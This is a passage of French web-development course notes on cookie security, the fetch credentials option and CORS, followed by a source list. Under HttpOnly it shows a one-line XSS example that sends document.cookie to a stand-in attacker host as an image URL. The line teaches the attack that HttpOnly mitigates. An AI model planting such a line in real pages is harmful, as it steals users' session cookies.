  Comportement ignoré sur `localhost`.

  <br>

* *HttpOnly* (désactivé par défaut) : Interdit à JavaScript d'accéder au cookie (avec `document.cookie`).
  
  Le cookie sera envoyé normalement avec toutes les requêtes, même celles de `fetch`.  

  Permet d'atténuer les [attaques XSS comme](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/)
  ```js
  new Image().src = `http://malicie.ux/vol-de-cookie.php?cookie=${document.cookie}`;
  ```

</section>
<section>

## Envoi de cookies par `fetch`

Pour envoyer les cookies avec une requête `fetch` *cross-origin*, il y a un mécanisme de sécurité en plus de `SameSite`.
<!-- cross-site ou cross-origin ? aucune d'implication entre les 2 ! -->

```js
fetch(url, {credentials: same-origin}) // ou omit ou include
```

L'option *credentials* de `fetch` contrôle si le navigateur envoie des cookies &
si le navigateur modifie les cookies (comme demandé par la réponse avec
l'en-tête `Set-Cookie`).

Valeur de *credentials* :
* *same-origin* (par défaut) : Pas d'envoi ni de modifications des cookies lors de requêtes *cross-origin*,
* *omit* : ne jamais envoyer ni modifier les cookies.
* *include* : Restrictions lors de requêtes *cross-origin* (à peu près celles des requêtes *CORS*)
  * requêtes simples : envoi systématique des cookies. Modification des cookies et
    lecture de la réponse si autorisation du serveur.
  * requêtes non simples : Si le serveur donne l'autorisation lors du
    *preflight*, alors la requête est envoyée avec les cookies, la réponse est
    lisible par JS, et les cookies soient modifiés.
  
  **Remarque :** L'autorisation du serveur doit contenir en plus `Accept-Control-Allow-Credentials:true`, et un `Access-Control-Allow-Origin` valide mais pas `*`.


<!-- https://developer.mozilla.org/en-US/docs/Web/API/RequestInit
https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#including_credentials -->


</section>
<section>

## Sources

* Certaines parties sont reprises de [JavaScript.info](https://javascript.info),
  avec l'aimable autorisation d'Ilya Kantor :  
  [`modules`](https://fr.javascript.info/modules-intro),
  [`fetch`, requêtes cross-origin](https://fr.javascript.info/network), 
  [Promesses, `async`/`await`](https://fr.javascript.info/async),
  [cookies](https://fr.javascript.info/cookie),
  [la boucle d'événement](https://fr.javascript.info/event-loop).
* Mozilla Developper Network :
  [Same-origin_policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy),
  [CSRF](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF),
  [Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch),
  [Options de `fetch`](https://developer.mozilla.org/en-US/docs/Web/API/RequestInit),
  [`<script type="module">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/script/type).
* [ANSSI : Guide & recommandations pour maitriser les standards de sécurité côté navigateur](https://cyber.gouv.fr/sites/default/files/2013/05/anssi-guide-recommandations_mise_en_oeuvre_site_web_maitriser_standards_securite_cote_navigateur-v2.0.pdf)


</section>

